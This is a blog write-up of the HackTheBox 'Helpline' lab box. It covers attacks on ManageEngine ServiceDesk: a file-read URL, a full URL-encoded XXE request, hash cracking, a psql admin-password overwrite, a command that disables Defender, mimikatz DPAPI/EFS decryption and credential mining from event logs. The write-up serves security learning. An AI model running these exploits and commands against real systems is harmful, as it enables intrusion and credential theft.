---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-03-28-helpline-hackthebox
tags:
- hackthebox
- manageengine
- mimikatz
- password cracking
- sql injection
- web
- windows
title: Helpline @ HackThebox
---

Helpline is a really fun box on [hackthebox.eu](https://www.hackthebox.eu), which I was lucky enough to get system first blood on :) Weirdly enough I couldn’t get the user first blood – but more to that later.

## Root Flag

Starting off with a quick scan we see the following open ports:

```
PORT      STATE SERVICE
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8080/tcp  open  http-proxy
```

We start by looking at tcp port 8080 and find a web application called manage engine running there. After trying some default credentials manually we get in with `guest:guest`. Looking around a bit in the web app we find an interesting solution called "Password Audit" which has an xls document attached:

![](htb_helpline_audit.png)

We download the document and run a quick `binwalk -e` on it to look for interesting contents. Grepping through the folder we notice the mentioning of some passwords (which turned out to be nothing of value) and an interesting file path "C:\\Temp\\Password Audit\\it\_logins.txt". The file mentions that in "it\_logins.txt" we can find subsequent audit details, so we have to find some way to read it.

After researching a bit for known vulnerabilities we find two promising ones:

- [tra-2017-31](https://www.tenable.com/security/research/tra-2017-31)
- [cve-2017-9362](https://labs.integrity.pt/advisories/cve-2017-9362/index.html)

We start by looking at the first one, an arbitrary file read that works for the version we have (9.3). Manage Engine has a file that stores information about backups that occurred which is called SDPbackup.log. We can read the file with with by using the first vulnerability:

```
http://helpline.htb:8080/fosagent/repl/download-file?basedir=4&filepath=bin\SDPbackup.log
```

After downloading the file we can see 2 promising strings in it:

```
\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data
\backup_postgres_9309_fullbackup_03_08_2019_09_04\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data
```

These are backups of the manage engine installation which we proceed to download the same way as before in order to enumerate the database. We find a lot of interesting stuff in the database files after unpacking them:

Users:

```
INSERT INTO AaaUser (user_id,first_name,middle_name,last_name,createdtime,description) VALUES
(1, N'System', N'', N'', 1096278446000, N'Mandatory ServiceDesk User - Should not be deleted');
(2, N'$DEPT_HEAD$', N'', N'', 1096278446000, N'Dummy User for SDP - placeholder for department head user. Used in Approvals.');
(3, N'Guest', N'', N'', 1545341882110, N'End User of the software product');
(4, N'administrator', N'', N'', 1545341882110, N'');
(5, N'Shawn Adams', N'', N'', 1545341882110, N'Help Desk Executive');
(6, N'Heather Graham', N'', N'', 1545341882110, N'Help Desk Executive');
(7, N'John Roberts', N'', N'', 1545341882110, N'Help Desk Executive');
(8, N'Howard Stern', N'', N'', 1545341882110, N'Help Desk Executive');
(9, N'Jeniffer Doe', N'', N'', 1545341882110, N'Help Desk Executive');
(301, N'Alice Jones', NULL, NULL, 1545428178314, N'');
(302, N'Luis Ribeiro', NULL, NULL, 1545428506376, N'');
(303, N'Zachary Moore', NULL, NULL, 1545428808156, N'');
(601, N'Stephen Ellis', NULL, NULL, 1545514863623, N'');
(602, N'Fiona Drake', NULL, NULL, 1545515090576, N'');
(603, N'Mary Wong', NULL, NULL, 1545516114042, N'');
(604, N'Anne Sergeant', NULL, NULL, 1545517214871, N'');
```

Logins:

```
INSERT INTO AaaLogin (login_id,user_id,name,domainname) VALUES
(1, 3, N'guest', N'-');
(2, 4, N'administrator', N'-');
(302, 302, N'luis_21465', N'-');
(303, 303, N'zachary_33258', N'-');
(601, 601, N'stephen', N'-');
(602, 602, N'fiona', N'-');
(603, 603, N'mary', N'-');
(604, 604, N'anne', N'-');
```

Password-Hashes:

```
INSERT INTO AaaPassword (password_id,password,algorithm,salt,passwdprofile_id,passwdrule_id,createdtime,factor) VALUES
(1, N'$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', N'bcrypt', N'$2a$12$6VGARvoc/dRcRxOckr6Wmu', 2, 1, 1545350288006, 12);
(302, N'$2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki', N'bcrypt', N'$2a$12$2WVZ7E/MbRgTqdkWCOrJP.', 2, 1, 1545428506907, NULL);
(303, N'$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm', N'bcrypt', N'$2a$12$Em8etmNxTinGuub6rFdSwu', 2, 1, 1545428808687, NULL);
(2, N'$2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa', N'bcrypt', N'$2a$12$hmG6bvLokc9jNMYqoCpw2O', 2, 1, 1545428960671, 12);
(601, N'$2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu', N'bcrypt', N'$2a$12$6sw6V2qSWANP.QxLarjHKO', 2, 1, 1545514864248, NULL);
(602, N'$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa', N'bcrypt', N'$2a$12$X2lV6Bm7MQomIunT5C651.', 2, 1, 1545515091170, NULL);
(603, N'$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu', N'bcrypt', N'$2a$12$gFZpYK8alTDXHPaFlK51Xe', 2, 1, 1545516114589, NULL);
(604, N'$2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy', N'bcrypt', N'$2a$12$4.iNcgnAd8Kyy7q/mgkTFu', 2, 1, 1545517215465, NULL);
```

We quickly start by cracking the found hashes with john in bruteforce mode and get a few cleartext credentials out of it (I also ran it with wordlists but couldn’t get more than these):

```
1234567890       (603)
1234567890       (603)
1q2w3e4r         (602) 
0987654321       (303)
guest            (1)
```

Unfortunately we can not do much with these credentials yet as none of these work work on WinRM, which is listening on tcp port 5985 or on smb. After fiddling a bit with the users we notice that we can log into smb with `zachary:0987654321`, however without access to any shares. But even without access to any shares we could confirm that this is a valid user account on the box. Unfortunately we can not use the vuln to read the file "it\_logins.txt" as we are on the "e:" drive, the file is on the "c:" drive and there are no ways to change the drive in the lfi vuln.

Since we cant get any further here we look at the other vuln, CVE-2017-9362, which is a XXE vulnerability. XXE vulnerabilities usually allow arbitrary read with the full path being specified which is exactly what we need. We take the poc, exchange the path so it points to the file we want, url encode and run it:

```
POST /api/cmdb/ci HTTP/1.1
Host: helpline.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=72BB25EF1B953C8FB46A00FB88C8A1C9; JSESSIONIDSSO=40B7FEE4C0A25759DF6AECA062A8C89A
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 2622

OPERATION_NAME=add&INPUT_DATA=%3c%21%44%4f%43%54%59%50%45%20%66%6f%6f%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%31%35%64%34%31%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%63%3a%2f%74%65%6d%70%2f%70%61%73%73%77%6f%72%64%20%61%75%64%69%74%2f%69%74%5f%6c%6f%67%69%6e%73%2e%74%78%74%22%3e%20%5d%3e%3c%41%50%49%20%76%65%72%73%69%6f%6e%3d%27%31%2e%30%27%20%6c%6f%63%61%6c%65%3d%27%65%6e%27%3e%0a%3c%72%65%63%6f%72%64%73%3e%0a%3c%72%65%63%6f%72%64%3e%0a%3c%70%61%72%61%6d%65%74%65%72%3e%0a%3c%6e%61%6d%65%3e%43%49%20%4e%61%6d%65%3c%2f%6e%61%6d%65%3e%0a%3c%76%61%6c%75%65%3e%54%6f%6d%63%61%74%20%53%65%72%76%65%72%20%33%26%78%78%65%31%35%64%34%31%3b%3c%2f%76%61%6c%75%65%3e%0a%3c%2f%70%61%72%61%6d%65%74%65%72%3e%0a%3c%70%61%72%61%6d%65%74%65%72%3e%0a%3c%6e%61%6d%65%3e%43%49%20%54%79%70%65%3c%2f%6e%61%6d%65%3e%0a%3c%76%61%6c%75%65%3e%42%75%73%69%6e%65%73%73%20%53%65%72%76%69%63%65%3c%2f%76%61%6c%75%65%3e%0a%3c%2f%70%61%72%61%6d%65%74%65%72%3e%0a%3c%70%61%72%61%6d%65%74%65%72%3e%0a%3c%6e%61%6d%65%3e%53%69%74%65%3c%2f%6e%61%6d%65%3e%0a%3c%76%61%6c%75%65%3e%28%65%6d%70%74%79%29%3c%2f%76%61%6c%75%65%3e%0a%3c%2f%70%61%72%61%6d%65%74%65%72%3e%0a%3c%70%61%72%61%6d%65%74%65%72%3e%0a%3c%6e%61%6d%65%3e%42%75%73%69%6e%65%73%73%20%49%6d%70%61%63%74%3c%2f%6e%61%6d%65%3e%0a%3c%76%61%6c%75%65%3e%48%69%67%68%3c%2f%76%61%6c%75%65%3e%0a%3c%2f%70%61%72%61%6d%65%74%65%72%3e%0a%3c%70%61%72%61%6d%65%74%65%72%3e%0a%3c%6e%61%6d%65%3e%44%65%73%63%72%69%70%74%69%6f%6e%3c%2f%6e%61%6d%65%3e%0a%3c%76%61%6c%75%65%3e%44%6f%6d%61%69%6e%20%43%6f%6e%72%6f%6c%6c%65%72%20%3c%2f%76%61%6c%75%65%3e%0a%3c%2f%70%61%72%61%6d%65%74%65%72%3e%0a%3c%70%61%72%61%6d%65%74%65%72%3e%0a%3c%6e%61%6d%65%3e%41%76%61%69%6c%61%62%69%6c%69%74%79%20%54%61%72%67%65%74%28%25%29%3c%2f%6e%61%6d%65%3e%0a%3c%76%61%6c%75%65%3e%32%30%30%3c%2f%76%61%6c%75%65%3e%0a%3c%2f%70%61%72%61%6d%65%74%65%72%3e%0a%3c%70%61%72%61%6d%65%74%65%72%3e%0a%3c%6e%61%6d%65%3e%53%65%72%76%69%63%65%20%53%75%70%70%6f%72%74%20%48%6f%75%72%73%3c%2f%6e%61%6d%65%3e%0a%3c%76%61%6c%75%65%3e%32%34%58%35%3c%2f%76%61%6c%75%65%3e%0a%3c%2f%70%61%72%61%6d%65%74%65%72%3e%0a%3c%70%61%72%61%6d%65%74%65%72%3e%0a%3c%6e%61%6d%65%3e%43%6f%73%74%3c%2f%6e%61%6d%65%3e%0a%3c%76%61%6c%75%65%3e%38%30%38%30%3c%2f%76%61%6c%75%65%3e%0a%3c%2f%70%61%72%61%6d%65%74%65%72%3e%0a%3c%70%61%72%61%6d%65%74%65%72%3e%0a%3c%6e%61%6d%65%3e%49%6e%63%69%64%65%6e%74%20%72%65%73%74%6f%72%61%74%69%6f%6e%20%74%61%72%67%65%74%3c%2f%6e%61%6d%65%3e%0a%3c%76%61%6c%75%65%3e%39%30%25%3c%2f%76%61%6c%75%65%3e%0a%3c%2f%70%61%72%61%6d%65%74%65%72%3e%0a%3c%2f%72%65%63%6f%72%64%3e%0a%3c%2f%72%65%63%6f%72%64%73%3e%0a%3c%2f%41%50%49%3e
```

This results in the contents of the file being printed out:

```
{"API":{"locale":"en","version":"1.0","response":{"operation":{"name":"add","result":{"statuscode":"3016","status":"Unable to perform the requested operation.","message":"Unable to add the CI(s), please refer the error message.","created-date":"Mar 26, 2019 06:31 PM"},"Details":{"records":{"failed":["1",{"ci":{"name":"Tomcat Server 3\r\nlocal Windows account created\r\n\r\nusername: alice\r\npassword: $sys4ops@megabank!\r\nadmin required: no\r\n\r\nshadow admin accounts:\r\n\r\nmike_adm:Password1\r\ndr_acc:dr_acc","error":"Sorry, you do not have the requisite permissions to add."}}],"success":"0","total":"1"}}}}}}
```

We learn about a windows account with the credentials `alice:$sys4ops@megabank!` and some other accounts which are not important. In the past (and frankly on this box too) I used the winrm shell by alamot to connect to winrm. In retrospective this gave me many problems, so I will show how to do it with a windows vm in this writeup. For windows to connect to the target box we need to use [CredSSP authentication](https://portal.nutanix.com/#/page/docs/details?targetId=Nutanix-Calm-Admin-Operations-Guide-v57:nuc-enabling-credssp-t.html). After adding the helplines ip address to the hosts file ("/windows/system32/drivers/etc/hosts"), we start the winrm service from an elevated command prompt with `sc start winrm` and start powershell in which we run `Enable-WSManCredSSP -Role "Client" -DelegateComputer "*"`. Now we need to allow credentials delegation with gpedit.msc:

Set Enabled and add "wsman/\*":

```
Computer Configuration > Administrative Templates > System > Credentials Delegation > Allow Delegating Fresh Credentials.
Computer Configuration > Administrative Templates > System > Credentials Delegation > Allow Delegating Fresh Credentials with NTLM only server authentication.
```

Now we can connect by running:

```
$user = 'HELPLINE\alice'
$pass = ConvertTo-SecureString -AsPlainText '$sys4ops@megabank!' -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$pass
New-PSSession -URI http://helpline:5985/wsman -Authentication CredSSP -Credential $cred
Enter-PSSession -id <id>
```

To exit the session:

```
Exit-PSSession
Remove-PSSession -Id <id>
```

This results in a valid session as alice:

![](htb_helpline_alice.png)After looking around a bit we notice that the postgres, that manage engine is using is running on tcp port 65432. If we could connect to postgres we could change passwords or directly write and read files in the context of postgres. We decide to overwrite the admin password of the application with the hash of another user (zachary) to get elevated permissions inside the application:

```
E:
cd ManageEngine\ServiceDesk\pgsql\bin
.\psql -p 65432 -h 127.0.0.1 -c "UPDATE aaapassword SET password=U&'\00242a\002412\0024Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm', algorithm='bcrypt', salt=U&'\00242a\002412\0024Em8etmNxTinGuub6rFdSwu', factor=null where password_id=2;" servicedesk postgres
```

Now we can log into the application as "administrator" with the password of zachary. The first thing we do is change the password to something only we know so we don’t create any shortcuts for other students. The application allows for a rather easy way to get a shell. We can create a Custom Trigger (creating a custom menu works too):

![](htb_helpline_system_shell.png)

Upon creation of the ticket we are given a shell as system:

![](htb_helpline_system_shell_triggered.png)

As it turns out we can neither read the root flag nor the user flag with this shell, as they are encrypted by EFS. To read the flag one would need a session as the particular user that owns the flag. One way to achieve this is to change the user passwords. We start by changing the admin password to something we know and add the admin to the winrm group:

```
net localgroup "Remote Management Users" administrator /add
net user administrator <password>
```

And connecting as administrator via winrm:

```
$user = 'HELPLINE\administrator'
$pass = ConvertTo-SecureString -AsPlainText '<password>' -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$pass
New-PSSession -URI http://helpline:5985/wsman -Authentication CredSSP -Credential $cred
Enter-PSSession <id>
```

Now we are logged in over winrm as administrator but still can not read the flag. I’m not entirely sure why this is the case but I guess it happens because we changed the password. After enumerating for a bit we see that the user leo has a file called "admin-pass.xml" on his desktop. However we can not read this file either. We try the same process again, change the password of leo and login as leo to double check if we can read the file in his user context.

Interestingly we can read the admin-pass.xml as leo (if someone knows why it works for leo but not for administrator please let me know):

```
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa
```

Researching the format a bit shows that this is a saved powershell credential string. We can convert it to cleartext via powershell:

```
$pw = Get-Content .\admin-pass.xml | ConvertTo-SecureString
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
mb@letmein@SERVER#acc
```

We have the cleartext password now which we could use to login as administrator and read the flag via winrm and credssp (the intended way). Since I didn’t know that at the time I researched for other ways and found a [way](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) to decrypt the EFS file, given the cleartext password of the user who encrypted it. Since it requires mimikatz we need to get it on the box. Defender will delete it right away so, since we are NT/System, we just disable Defender:

```
powershell.exe -exec bypass -command Set-MpPreference -DisableRealtimeMonitoring $true
```

After getting mimikatz via powershell onto the target we run mimikatz and decrypt root.txt, resulting in the first blood on this box.

Starting mimikatz and setting permissions:

```
mimikatz.exe 
privilege::debug 
token::elevate 
```

Retrieving the private key of the user:

```
dpapi::capi /in:"c:\Users\administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85"
```

The private key is encrypted with the masterkey, which we decrypt with:

```
dpapi::masterkey /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-500\9e78687d-d881-4ccb-8bd8-bc0a19608687" /password:"mb@letmein@SERVER#acc"
```

We now can decrypt the private key of the user by giving it the decrypted master key:

```
dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85" /masterkey:b18974052cb509a86a008869fd95388550678184
```

Now that the private key is decrypted and stored in a .pvk file we get it onto a linux box and build a pfx file out of it:

```
openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem

openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk -out private.pem

openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

After getting the pfx on the box we install it with certutil and can read the flag:

```
certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
type "c:\Users\Administrator\Desktop\root.txt"
```

## User Flag

So we got system but still don’t have a user flag. Enumerating the box some more we find that zachary (which we had the password of from the early beginning), is a member of the "Event Log Readers" group. A strong hint in hindsight. We download the security event log "Security.evtx" to our linux attacker box and convert it to xml:

```
python evtx_dump.py Security.evtx > Security.xml
```

In the xml we find a log entry showing the password of tolu:

```
<Data Name="CommandLine">"C:\Windows\system32\systeminfo.exe" /S \\helpline /U /USER:tolu /P !zaq1234567890pl!99</Data>
```

With the password we repeat the process we did for root.txt and decrypt the user flag. Another way as mentioned before is to use CredSSP to connect with the newfound credentials via WinRM:

```
$user = 'HELPLINE\tolu'
$pass = ConvertTo-SecureString -AsPlainText '!zaq1234567890pl!99' -Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$pass
New-PSSession -URI http://helpline:5985/wsman -Authentication CredSSP -Credential $cred
Enter-PSSession -id <id> 
```

In this case we do not have to decrypt anything as windows is doing it automatically for us (the intended way).

This box was really amazing and I did everything wrong that can be done wrong but in the end I learned a lot. Not only about the mimikatz crypto api but also about the value of having a windows pentesting vm and some neat powershell tricks! Thanks to [egre55](https://twitter.com/egre55) for making this box and showing me his writeup to learn about the intended way.